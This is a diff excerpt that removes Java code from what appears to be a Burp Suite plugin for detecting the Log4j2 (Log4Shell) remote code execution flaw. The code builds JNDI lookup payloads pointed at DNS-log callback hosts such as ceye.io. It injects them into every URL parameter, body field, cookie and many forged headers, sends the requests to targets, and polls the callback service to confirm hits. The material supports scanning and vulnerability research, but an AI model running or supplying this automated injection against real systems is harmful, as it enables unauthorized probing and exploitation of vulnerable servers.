-                String[] hostlists = host.split(":");
-                if (hostlists[0].endsWith(white_host_single) || request_header_host.endsWith(white_host_single)) {
-                    return null;
-                }
-            }
-        }
-        byte[] response = baseRequestResponse.getResponse();
-        IResponseInfo analyzedIResponseInfo = this.helpers.analyzeResponse(response);
-
-
-        List<String> response_header = analyzedIResponseInfo.getHeaders(); // 获取请求头
-
-        //增加响应包的Content-type黑名单
-        List<String> response_black_lists = Arrays.asList("Content-Type: image/jpeg","Content-Type: image/jpg","Content-Type: image/png"
-        ,"Content-Type: application/octet-stream","Content-Type: text/css");
-
-        for (String response_header_single : response_header){
-            for (String response_black_single: response_black_lists)
-            {
-                if (response_black_single.equals(response_header_single))
-                    return null;
-            }
+        } catch (Exception e) {
+            // TODO: handle exception
         }
 
-        String firstrequest_header = request_header.get(0); //第一行请求包含请求方法、请求uri、http版本
-        String[] firstheaders = firstrequest_header.split(" ");
-
-        String uri = firstheaders[1].split("\\?",2)[0].replace("/",".");
-
-        if (firstheaders[1].split("\\?")[0].replace("/",".").length() > 25) {
-            uri = firstheaders[1].split("\\?")[0].replace("/",".").substring(0, 25);
-        }
-
-        String total_uri = "";
-        String[] uris = uri.split("\\.");
-        for(String uri_single:uris) {
-            if (!uri_single.equals(""))
-                total_uri = total_uri + "." + uri_single.substring(0,1);
-        }
-        uri = total_uri;
-
-        if (uri.endsWith("."))
-            uri = uri.substring(0,uri.length()-1);
-
-        if (this.jndiparam.equals("jndi"))
-            this.jndiparam = this.jndiparam + ":";
-
-        String random_str = RandomStringUtils.randomAlphanumeric(3); //生成指定长度的字母和数字的随机组合字符串
-
-        if (!this.dnsldaprmi.contains(":"))
-            this.dnsldaprmi = this.dnsldaprmi + ":";
-
-        String vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "//" + firstheaders[0].trim().toLowerCase() + "." + host  + uri + "." + random_str + "." + this.logxn_dnslog.trim() + "/%20test}";
-
-        if (this.isip && this.privatedns){
-            vulnurl = "${" + this.jndiparam + this.dnsldaprmi.trim() + "//" + this.logxn_dnslog.trim() + "/%20test}";
-        }
-
-        String uri_total = "";
-
-        // uri黑名单，如果匹配到不进行扫描
-        List<String> blacklists = Arrays.asList(".js",".jpg",".png",".jpeg",".svg",".mp4",".css",".mp3",".ico",".woff",".woff2");
-
-        for (String black_single: blacklists)
-            if (firstheaders[1].split("\\?")[0].endsWith(black_single))
-                return null;
-
-        //firstheaders[0] 为请求方法
-        //firstheaders[1] 为请求的uri
-        //firstheaders[2] 为请求协议版本，不用看
-
-        /*****************获取body 方法一**********************/
-        int bodyOffset = analyzedIRequestInfo.getBodyOffset();
-        byte[] byte_Request = baseRequestResponse.getRequest();
-
-        String request2 = new String(byte_Request); //byte[] to String
-        String body = request2.substring(bodyOffset); // 请求体
-        if(!firstheaders[1].contains("?")) {  // 无参情况，直接在路径后面添加payload
-            firstheaders[1] = firstheaders[1] + vulnurl_param(vulnurl, param_i++, this.isipincreasing);
-        }
-
-        // 这里一直到POST的行，因为GET、POST、PUT等其他请求都可能请求的uri有参数
-        String[] requries = new String[0];
-        if (firstheaders[1].contains("?")) {
-            String[] requris = firstheaders[1].split("\\?",2);
-
-            if (requris.length > 1) {
-                requries = requris[1].split("&");
-                for (String uri_single : requries) {
-                    String[] uri_single_lists = uri_single.split("=");
-                    uri_total = uri_total + uri_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++,this.isipincreasing) + "&";
-                }
-                uri_total = uri_total.substring(0, uri_total.length() - 1);
-            }
-            firstheaders[1] = requris[0] + "?" + uri_total;
-        }
-        firstheaders[1] = firstheaders[1].replace("{","%7b").replace("}","%7d"); // 替换GET参数里的{和}
-        String request_header_content_type = "";
-        for ( int ii =0;ii <request_header.size() ;ii++) {
-            if (request_header.get(ii).contains("Content-Type") || request_header.get(ii).contains("content-type")){
-                String[] request_header_content_types = request_header.get(ii).split(":");
-                request_header_content_type = request_header_content_types[1];
-            }
-        }
-
-        if(firstheaders[0].contains("POST") || firstheaders[0].contains("PUT")){
-
-            /**  .contains("=")    !.contains("{")
-             * a=1&b=2&c=3
-             */
-//            if (request_header_content_type.contains("multipart/form-data"))
-//                stdout.println("66666666666");
-
-            if (body.contains("=") && !body.contains("{") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml") ) {
-//                stdout.println(request_header);
-//                stdout.println(body);
-                String body_total = "";
-                String[] bodys_single = body.split("&");
-                for(String body_single:bodys_single) {
-                    String[] body_single_lists = body_single.split("=");
-                    body_total = body_total + body_single_lists[0] + "="  + vulnurl_param(vulnurl, param_i++,this.isipincreasing) +  "&" ;
-                }
-                body_total = body_total.substring(0,body_total.length()-1);
-                body =  body_total;
-            }
-
-            /** !.contains("=")    .contains("{")
-             * {"a":"1","b":"22222"}
-             */
-            else if( !body.contains("={") && body.contains("{") && !body.contains("&") && body.contains("\":\"") && !body.contains(":{\"") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")){
-                JSONObject jsonObject = JSON.parseObject(body);
-                for (String key:jsonObject.keySet()) {
-                    jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                }
-                body = jsonObject.toString();
-            }
-
-            /** .contains("=")    .contains("{")
-             * a=1&param={"a":"1","b":"22222"}
-             */
-            else if( body.contains("={") && body.contains("&") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")){
-                String body_total = "";
-                String[] bodys_single = body.split("&");
-                for(String body_single:bodys_single) {
-                    if (body_single.contains("{")){
-                        String[] body_single_lists = body_single.split("=");
-                        JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
-                        for (String key:jsonObject.keySet()) {
-                            jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                        }
-                        body_total = body_total + body_single_lists[0] + "=" + jsonObject.toString() + "&";
-                    }else {
-                        String[] body_single_lists = body_single.split("=");
-                        body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++,this.isipincreasing) + "&";
-                    }
-                }
-                body_total = body_total.substring(0,body_total.length()-1);
-                body =  body_total;
-            }
-
-            /**
-             * body={"a":"1","b":"22222"}
-             */
-            else if(body.contains("={") && !body.contains("&") && !body.contains("\":{") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")){
-                String body_total = "";
-                if (body.contains("{")){
-                    String[] body_single_lists = body.split(body.split("=")[0] + "=");
-                    JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
-                    for (String key:jsonObject.keySet()) {
-                        jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                    }
-                    body_total = body_total + body.split("=")[0] + "=" + jsonObject.toString();
-                }else {
-                    String[] body_single_lists = body.split("=");
-                    body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++,this.isipincreasing) ;
-                }
-                body = body_total;
-            }
-
-            /**
-             * body={"params":{"a":"1","b":"22222"}}
-             */
-            else if (body.contains("={\"") && !body.contains("&") && body.contains("\":{") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")){
-                String body_code = body;
-                body = body.split(body.split("=")[0] + "=")[1];
-
-                JSONObject jsonObject = JSON.parseObject(body);
-                for (String key:jsonObject.keySet()) {
-                    if (jsonObject.getString(key).contains("{")){
-                        JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
-                        for (String key2:jsonObject2.keySet())
-                            jsonObject2.put(key2,vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                        jsonObject.put(key,jsonObject2);
-                    } else
-                        jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                }
-                body = body_code.split("=")[0] + "=" + jsonObject.toString();
-            }
-            /** !.contains("&")    .contains("\":{")  !.contains("={")
-             * {"params":{"a":"1","b":"22222"}}
-             */
-            else if( body.contains("\":{") && !body.contains("={\"") && !request_header_content_type.contains("multipart/form-data") && !request_header_content_type.contains("text/xml")) {
-                JSONObject jsonObject = JSON.parseObject(body);
-                for (String key:jsonObject.keySet()) {
-                    if (jsonObject.getString(key).contains("{")){
-                        JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
-                        for (String key2:jsonObject2.keySet())
-                            jsonObject2.put(key2,vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                        jsonObject.put(key,jsonObject2);
-                    } else
-                        jsonObject.put(key, vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-                }
-                body = jsonObject.toString();
-            }
-            else if( request_header_content_type.contains("application/x-www-form-urlencoded") && body.contains("xml version") ||
-                    request_header_content_type.contains("application/x-www-form-urlencoded") && body.contains("!DOCTYPE") ||
-                    request_header_content_type.contains("application/x-www-form-urlencoded") && body.contains("%21DOCTYPE")) { // 增加xml格式识别
-                try {
-                    body = java.net.URLDecoder.decode(body, "UTF-8");
-                } catch (UnsupportedEncodingException e) {
-                    e.printStackTrace();
-                }
-                // 第一种情况
-                // a=1&b=2&c=<?xml version=“1.0” encoding = “UTF-8”?>
-                // <COM>
-                //<REQ name="1111">
-                //<USER_ID>yoyoketang</USER_ID>
-                //<COMMODITY_ID>123456</COMMODITY_ID>
-                //<SESSION_ID>absbnmasbnfmasbm1213</SESSION_ID>
-                //</REQ>
-                //</COM>&d=333
-                if (body.contains("&")) {
-                    String body_total = "";
-                    String[] bodys_single = body.split("&");
-                    for (String body_single : bodys_single) {
-                        if (!body_single.contains("?xml")) {
-                            String[] body_single_lists = body_single.split("=");
-                            body_total = body_total + body_single_lists[0] + "=" + vulnurl_param(vulnurl, param_i++, this.isipincreasing) + "&";
-                        } else {
-                            String[] body_single_lists = body_single.split("=");
-                            List<String> list = new ArrayList<String>();
-                            Pattern pattern = Pattern.compile(">(.*?)</");
-                            Matcher m = pattern.matcher(body_single_lists[1]);
-                            String single_xml = "";
-                            while (m.find()) {
-                                list.add(m.group(1));
-//                        System.out.println(m.group(1));
-                            }
-                            for (String str : list) {
-                                body_single_lists[1] = body_single_lists[1].replace(">" + str + "</", ">" + vulnurl_param(vulnurl, param_i++, this.isipincreasing) + "</");
-                            }
-                            body_total = body_total + body_single_lists[0] + "=" + body_single_lists[1];
-                        }
-                    }
-                    body_total = body_total.substring(0, body_total.length() - 1);
-                    body = body_total;
-                }
-            } else if (request_header_content_type.contains("text/xml")){
-                // 第二种情况
-                //<?xml version=“1.0” encoding = “UTF-8”?>
-                // <COM>
-                //<REQ name="111">
-                //<USER_ID>yoyoketang</USER_ID>
-                //<COMMODITY_ID>123456</COMMODITY_ID>
-                //<SESSION_ID>absbnmasbnfmasbm1213</SESSION_ID>
-                //</REQ>
-                //</COM>
-                List<String> list = new ArrayList<String>();
-                Pattern pattern = Pattern.compile(">(.*?)</");
-                Matcher m = pattern.matcher(body);
-
-                while (m.find()) {
-                    list.add(m.group(1));
-//                        System.out.println(m.group(1));
-                }
-                for (String str: list){
-                    body = body.replace(">" + str + "</",">" + vulnurl_param(vulnurl, param_i++, this.isipincreasing) + "</");
-                }
-            }
-
-            else if( request_header_content_type.contains("multipart/form-data") ){
-                // file文件格式 感觉没必要去考虑
-//                stdout.println("multipart");
-//                stdout.println(body);
-                List<String> list_multipart = new ArrayList<String>();
-                Pattern pattern = Pattern.compile("\n(.*?)\r\n--");
-                Matcher m = pattern.matcher(body);
-                while (m.find()) {
-                    list_multipart.add(m.group(1));
-//                    stdout.println(m.group(1));
-                }
-                for ( String str : list_multipart)
-                    body = body.replace("\n" + str + "\r\n--" , "\n" + vulnurl_param(vulnurl, param_i++, this.isipincreasing) + "\r\n--");
-            }
-
-
-            body = body.replace("$","%24"); // 对请求体的{、}、$、/进行编码
-        }
-
-        request_header.set(0,firstheaders[0] + " " + firstheaders[1] + " " + firstheaders[2]);
-
-        // 去除源请求包里的Origin参数
-        /*****************增加header**********************/
-        List<String> xff_lists = Arrays.asList("X-Forwarded", "X-Forwarded-Host",
-                "X-remote-IP","X-remote-addr","True-Client-IP","Client-IP","X-Real-IP",
-                "Ali-CDN-Real-IP","Cdn-Src-Ip","Cdn-Real-Ip","CF-Connecting-IP","X-Cluster-Client-IP",
-                "WL-Proxy-Client-IP", "Proxy-Client-IP","Fastly-Client-Ip","True-Client-Ip","X-Originating-IP",
-                "X-Host","X-Custom-IP-Authorization","X-original-host","X-forwarded-for");
-//        "X-Requested-With",
-
-        StringBuilder cookie_total = new StringBuilder();
-
-        String lowup = "up"; // 默认Cookie为大写
-
-        for (int i = 0; i < request_header.size(); i++) {
-
-            if (request_header.get(i).contains("User-Agent:") || request_header.get(i).contains("token:") || request_header.get(i).contains("Token:") || request_header.get(i).contains("Bearer Token:"))
-                if (this.isuseUserAgentTokenXff) // 是否测试UA头、token、X-Forward-for头以及X-Client-IP头
-                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
-
-            if (request_header.get(i).contains("X-Forwarded-For:") && this.isuseUserAgentTokenXff){
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
-            }
-
-//            if (request_header.get(i).contains("X-Client-IP:") && this.isuseUserAgentTokenXff){
-//                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
-//            }
-
-
-            if (request_header.get(i).contains("X-Api-Version:") && this.isuseUserAgentTokenXff){
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing)); // UA头增加 token增加(jwt)
-            }
-
-            // Content-Type、Referer、Accept-Language、Accept、Accept-Encoding、Origin等都有可能成为触发点
-            if (request_header.get(i).contains("Content-Type:") && this.isuseContenttype)
-//                    stdout.println(isuseRefererOrigin);
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl.replace("%24","$"), param_i++,this.isipincreasing));
-
-            if ((request_header.get(i).contains("Referer:") || request_header.get(i).contains("referer:") ) && this.isuseRefererOrigin)
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-            if (request_header.get(i).contains("Accept-Language:") && this.isuseAccept)
-                request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-            if (request_header.get(i).contains("Accept:") && this.isuseAccept)
-                request_header.set(i, request_header.get(i) + ","+ vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-            if (request_header.get(i).contains("Accept-Encoding:") && this.isuseAccept)
-                request_header.set(i, request_header.get(i) + "," + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-            if (request_header.get(i).contains("Origin:") && this.isuseRefererOrigin)
-                request_header.set(i, request_header.get(i) + "," + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-
-//                stdout.println("1197");
-//                stdout.println(request_header.get(0));
-
-            for (String xff:xff_lists)
-                if (request_header.get(i).contains(xff + ":"))
-                    request_header.set(i,request_header.get(i) + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-            if (request_header.get(i).contains("cookie:") || request_header.get(i).contains("Cookie:") ) {
-                if (request_header.get(i).contains("cookie:")) {
-                    lowup = "low";
-                }else if (request_header.get(i).contains("Cookie:") ){
-                    lowup = "up";
-                }
-                if (this.isuseAllCookie) { // 对所有cookie发起请求
-//                        stdout.println("isuseallCookie为" + this.isuseAllCookie);
-                    String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");//去掉cookie: 、Cookie:
-                    String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
-                    for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
-                        String[] cookie_single_lists = cookie_single.split("=");
-                        cookie_total.append(cookie_single_lists[0]).append("=").append(vulnurl_param(vulnurl, param_i++,this.isipincreasing)).append("; ");
-                    }
-                    if (lowup.contains("up"))
-                        request_header.set(i, "Cookie:" + cookie_total); // Cookie头增加
-                    else
-                        request_header.set(i, "cookie:" + cookie_total); // cookie头增加
-                }
-//                else{ // 只对单条cookie发起请求
-////                        stdout.println("1219");
-////                        stdout.println(this.isuseAccept);
-//                    String cookies = request_header.get(i).replace("cookie:", "").replace("Cookie:", "");//去掉cookie: 、Cookie:
-//                    String[] cookies_lists = cookies.split(";"); // 根据; 分割cookie
-//                    String[] cookie_single_0 = cookies_lists[0].split("=");
-//                    cookies_lists[0] = cookie_single_0[0] + "=" + cookie_single_0[1] + vulnurl_param(vulnurl, param_i++,this.isipincreasing);
-//                    for (String cookie_single : cookies_lists) {  // 把分割出来的单个cookie的值进行vulnurl添加
-//                        cookie_total.append(cookie_single).append("; ");
-//                    }
-//                    if (lowup.contains("up"))
-//                        request_header.set(i, "Cookie:" + cookie_total); // Cookie头增加
-//                    else
-//                        request_header.set(i, "cookie:" + cookie_total); // cookie头增加
-//                }
-            }
-        }
-//            for (String xff:xff_lists)
-//                if (!request_header.contains(xff + ":") && this.isuseXfflists )  // 是否用xff列表测试，包含其他标识IP头
-//                    request_header.add(xff + ": 127.0.0.1 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-//            stdout.println("1238");
-//            stdout.println(request_header.get(0));
-        if ( headers_lists.length > 0 && !headers_lists[0].equals("") ) { // 判断自定义参数不为空   加上了判断index为0不为空的状态
-            for (String headers_host_single : headers_lists) // 白名单设置
-            {
-                if (!request_header.contains(headers_host_single + ":")) // 如果自定义header的参数，就增加
-                    request_header.add( headers_host_single + ":" + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-            }
-        }
-        // 参数头由于参数问题，XFF头 如果没有参数，还会自动加上
-        if (!request_header.contains("X-Forwarded-For:") ) // 如果没有xff头，就增加
-            request_header.add( "X-Forwarded-For: " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//        if (!request_header.contains("X-Client-IP:") && this.isuseUserAgentTokenXff) // 如果没有x-client-ip头，就增加
-//            request_header.add( "X-Client-IP: 127.0.0.1 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//        if (!request_header.contains("If-Modified-Since:") && this.isuseUserAgentTokenXff) // 如果没有If-Modified-Since头，就增加(bp貌似会自动去除，与Last-Modified成对出现)
-//        {
-////                stdout.println("no If-Modified-Since: 1 ");
-//            request_header.add("If-Modified-Since: 1 " + vulnurl_param(vulnurl, param_i++, this.isipincreasing));
-////                stdout.println(request_header);
-//        }
-//
-//        if (!request_header.contains("X-Api-Version:") && this.isuseUserAgentTokenXff) // 如果没有If-Modified-Since头，就增加(bp貌似会自动去除，与Last-Modified成对出现)
-//        {
-////                stdout.println("no If-Modified-Since: 1 ");
-//            request_header.add("X-Api-Version: 1 " + vulnurl_param(vulnurl, param_i++, this.isipincreasing));
-////                stdout.println(request_header);
-//        }
-
-        // 如果没有参数，那么将不会测试
-//            if (!request_header.contains("Content-Type:") && this.isuseRefererOrigin)
-//                request_header.add( "Content-Type: text/plain;charset=UTF-8 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//            if ((!request_header.contains("Referer:") || !request_header.contains("referer:") ) && this.isuseRefererOrigin)
-//                request_header.add( "Referer: https://www.google.com " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//            if (!request_header.contains("Accept-Language:") && this.isuseAccept)
-//                request_header.add( "Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//            if (!request_header.contains("Accept:") && this.isuseAccept)
-//                request_header.add( "Accept: */* " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//            if (!request_header.contains("Accept-Encoding:") && this.isuseAccept)
-//                request_header.add( "Accept-Encoding: gzip, deflate " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-//
-//            if (!request_header.contains("Origin:") && this.isuseRefererOrigin)
-//                request_header.add( "Origin: https://www.google.com " + vulnurl_param(vulnurl, param_i++,this.isipincreasing));
-
-        for (int j = 0; j < request_header.size() ; j++){
-            if (j != 0) {
-                // 对payload进行优化，在测试某些系统中发现，$符号会造成请求不解析，具体可以在内网某远A8系统找到该类情况，但是由于在
-                // 内网VMWARE测试发现，如果Content-type中的$进行url编码，会触发不了漏洞，故增加改动如下，正常uri请求中header携带
-                // 的请求头中的$进行编码处理，payload的uri请求头中header携带的请求头中的$不进行编码处理
-                code_headers.add(request_header.get(j).replace("%20test","test"));
-            }
-            else if(j == 0) {
-                code_headers.add(firstrequest_header);
-            }
-        }
-        request_headers.add(request_header); // 将uri被payload化的请求加入待请求集
-
-        for (int jj = 0; jj < request_header.size() ; jj++){ // 替换header里的$为%24
-            if (jj == 0){
-                if (request_header.get(0).contains("/druid" )){
-                    request_header.set(jj, request_header.get(jj));
-                }
-            }else {
-                request_header.set(jj, request_header.get(jj).replace("$", "%24"));
-            }
-        }
-
-        if ( !code_headers.get(0).equals(request_header.get(0)) ) // 如果uri payload化
-        {
-            request_headers.add(code_headers); // 将原请求添加到请求集
-            request_headers.add(code_headers);
-//            request_headers.add(code_headers);
-        }
-        int ij = 1;
-        for(List<String> request_header_single:request_headers) { // 遍历请求集
-
-            if ( ij == 1 && this.isipincreasing) { // payload化的uri
-//                vulnurl = vulnurl.replace("." + this.logxn_dnslog, ij + "." + this.logxn_dnslog);
-                body = body.replace( "." + this.logxn_dnslog.trim(), ij + "." + this.logxn_dnslog.trim());
-                for(int jji = 0 ;jji < request_header_single.size(); jji++){
-                    request_header_single.set(jji,request_header_single.get(jji).replace("." + this.logxn_dnslog.trim(), ij + "." + this.logxn_dnslog.trim()));
-                }
-            }
-//            else if ( ij == 2 && this.isipincreasing) { // 正常uri $编码
-//                body = body.replace("$","%24");
-////                vulnurl = vulnurl.replace(ij - 1 +"." + this.logxn_dnslog, ij + "." + this.logxn_dnslog);
-//                body = body.replace(ij - 1 + "." + this.logxn_dnslog.trim(), ij + "." + this.logxn_dnslog.trim());
-//                for(int jji = 0 ;jji < request_header_single.size(); jji++){
-//                    request_header_single.set(jji,request_header_single.get(jji).replace(ij - 1 + "." + this.logxn_dnslog.trim(), ij + "." + this.logxn_dnslog.trim()).replace("$","%24"));
-//                }
-//            }
-            else if ( ij == 2 && this.isipincreasing) { // 正常uri $不编码 正常body
-//                vulnurl = vulnurl.replace(ij - 1 +"." + this.logxn_dnslog, ij + "." + this.logxn_dnslog);
-//                body = body.replace(ij - 1 + "." + this.logxn_dnslog.trim(), ij + "." + this.logxn_dnslog.trim()).replace("%24","$");
-                for(int jji = 0 ;jji < request_header_single.size(); jji++){
-//                    stdout.println(request_header_single.get(jji));
-                    request_header_single.set(jji,request_header_single.get(jji).replace(  "." + this.logxn_dnslog.trim(), ij + "." + this.logxn_dnslog.trim()).replace("%24","$"));
-                }
-            }
-            else if ( ij == 3 && this.isipincreasing) { // 正常uri 加入payload的请求
-                body = body.replace(ij-2 +"." + this.logxn_dnslog.trim(), ij + "." + this.logxn_dnslog.trim()).replace("%24","$");
-                for(int jji = 0 ;jji < request_header_single.size(); jji++){
-                    request_header_single.set(jji,request_header_single.get(jji).replace(ij - 1 + "." + this.logxn_dnslog.trim(), ij + "." + this.logxn_dnslog.trim()).replace("%24","$"));
-                }
-            }
-            byte[] request_bodys;
-            String reqMethod;
-            byte[] newRequest;
-            byte[] response3;
-            IHttpRequestResponse newIHttpRequestResponse;
-
-            if ( ij == 2 && this.isipincreasing) { // 正常uri  $不编码
-                String body_code = request2.substring(bodyOffset); // 正常请求体
-                request_bodys = body_code.getBytes();  //String to byte[]
-                reqMethod = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
-                newRequest = this.helpers.buildHttpMessage(request_header_single, request_bodys);
-
-                newIHttpRequestResponse = this.callbacks.makeHttpRequest(httpService, newRequest);
-                response3 = newIHttpRequestResponse.getResponse();
-            }
-//            else if ( ij == 3 && this.isipincreasing) { // 正常uri $不编码
-//                String body_code = request2.substring(bodyOffset); // 正常请求体
-//                request_bodys = body_code.getBytes();  //String to byte[]
-//                reqMethod = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
-//                newRequest = this.helpers.buildHttpMessage(request_header_single, request_bodys);
-//
-//                newIHttpRequestResponse = this.callbacks.makeHttpRequest(httpService, newRequest);
-//                response3 = newIHttpRequestResponse.getResponse();
-//            }
-            else{
-                request_bodys = body.getBytes();  //String to byte[]
-                reqMethod = this.helpers.analyzeRequest(baseRequestResponse).getMethod();
-                newRequest = this.helpers.buildHttpMessage(request_header_single, request_bodys);
-
-                newIHttpRequestResponse = this.callbacks.makeHttpRequest(httpService, newRequest);
-                response3 = newIHttpRequestResponse.getResponse();
-            }
-            ij ++;
-
-            if (this.logxn) { // logxn 的dnslog记录
-                String words_vuln = firstheaders[0].trim().toLowerCase() + "." + host.trim() + uri.trim();
-//                if (words_vuln.length() > 20)
-//                    words_vuln = words_vuln.substring(words_vuln.length() - 20);
-                OkHttpClient client = new OkHttpClient();
-                String indexUrl = "https://log.xn--9tr.com/" + this.logxn_dnslog_token.trim();
-//                stdout.println(indexUrl);
-                Request loginReq = new Request.Builder()
-                        .url(indexUrl)
-                        .get()
-                        .build();
-                try {
-                    Robot r = new Robot();
-                    r.delay(2500);
-                } catch (AWTException e) {
-                    e.printStackTrace();
-                }
-                Call call = client.newCall(loginReq);
-
-                Response response2 = null;
-//                stdout.println(this.logxn);
-                try {
-                    response2 = call.execute();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-                try {
-                    assert response2 != null;
-                    String respCookie = response2.body().string(); // dnslog的响应体
-
-
-                    if (respCookie.contains(words_vuln) && respCookie.contains(ij - 1 + "." + this.logxn_dnslog.trim())) {
-
-                        String param_vuln = "";
-                        for (int param_vuln_i = param_i;param_vuln_i >= 0; param_vuln_i -- ){
-                            if (respCookie.contains("\"" + param_vuln_i + "." + firstheaders[0].trim().toLowerCase() )  ){
-                                param_vuln = param_vuln + "param " + param_vuln_i + " is vulned ";
-                            }
-                        }
-                        synchronized (this.Udatas) {
-//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
-                            int row = this.Udatas.size();
-                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response3).getStatusCode() + "", "log4j2 rce " + param_vuln, newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
-                            fireTableRowsInserted(row, row);
-                            List<IScanIssue> issues = new ArrayList(1);
-                            issues.add(new CustomScanIssue(
-                                    httpService,
-                                    url,
-                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
-                                    "log4j2 RCE",
-                                    "log4j2 RCE" + param_vuln,
-                                    "High"
-                            ));
-                            return issues;
-                        }
-                    }
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-
-            if (this.ceyeio) { // ceye 的dnslog记录
-                String words_vuln = firstheaders[0].trim().toLowerCase() + "." + host.trim() + uri.trim();
-                if (words_vuln.length() > 20)
-                    words_vuln = words_vuln.substring(words_vuln.length() - 20);
-//                stdout.println(firstheaders[0].trim() + "." + host + uri);
-                OkHttpClient client = new OkHttpClient();
-                String indexUrl = "http://api.ceye.io/v1/records?token=" + this.ceyetoken.trim() + "&type=dns&filter=" ;
-                Request loginReq = new Request.Builder()
-                        .url(indexUrl)
-                        .get()
-                        .build();
-                try {
-                    Robot r = new Robot();
-                    r.delay(2500);
-                } catch (AWTException e) {
-                    e.printStackTrace();
-                }
-                Call call = client.newCall(loginReq);
-
-                Response response2 = null;
-                try {
-                    response2 = call.execute();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-                try {
-                    assert response2 != null;
-                    String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体
-//                    stdout.println(respCookie);
-
-                    if (respCookie.contains(words_vuln) && respCookie.contains(ij - 1 + "." + this.logxn_dnslog.trim()) ) {
-                        String param_vuln = "";
-                        for (int param_vuln_i = param_i;param_vuln_i >= 0; param_vuln_i -- ){
-                            if (respCookie.contains("\"" +param_vuln_i + "." + firstheaders[0].trim().toLowerCase() )  ){
-                                param_vuln = param_vuln + "param " + param_vuln_i + " is vulned ";
-                            }
-                        }
-                        synchronized (this.Udatas) {
-//                        List<Object> mes = FindKey(newIHttpRequestResponse, getRememberMeNumber(response));
-                            int row = this.Udatas.size();
-                            this.Udatas.add(new TablesData(row, reqMethod, url.toString(), this.helpers.analyzeResponse(response3).getStatusCode() + "", "log4j2 rce " + param_vuln, newIHttpRequestResponse, httpService.getHost(), httpService.getPort()));
-                            fireTableRowsInserted(row, row);
-                            List<IScanIssue> issues = new ArrayList(1);
-                            issues.add(new CustomScanIssue(
-                                    httpService,
-                                    url,
-                                    new IHttpRequestResponse[]{newIHttpRequestResponse},
-                                    "log4j2 RCE",
-                                    "log4j2 RCE" + param_vuln,
-                                    "High"
-                            ));
-                            return issues;
-                        }
-                    }
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-            }
-
-            if (this.privatedns && !this.isip) { // privatedns 的dnslog记录
-                String words_vuln = firstheaders[0].trim().toLowerCase() + "." + host.trim() + uri.trim();
-                if (words_vuln.length() > 20)
-                    words_vuln = words_vuln.substring(words_vuln.length() - 20);
-                OkHttpClient client = new OkHttpClient();
-
-                String indexUrl = privatednsResponseurl.trim();
-                Request loginReq = new Request.Builder()
-                        .url(indexUrl)
-                        .get()
-                        .build();
-
-                Call call = client.newCall(loginReq);
-
-                call.timeout();
-
-                try {
-                    Robot r = new Robot();
-                    r.delay(2500);
-                } catch (AWTException e) {
-                    e.printStackTrace();
-                }
-
-                Response response2 = null;
-                try {
-                    response2 = call.execute();
-                } catch (IOException e) {
-                    e.printStackTrace();
-                }
-                try {
-                    assert response2 != null;
-                    String respCookie = Objects.requireNonNull(response2.body()).string(); // dnslog的响应体
-
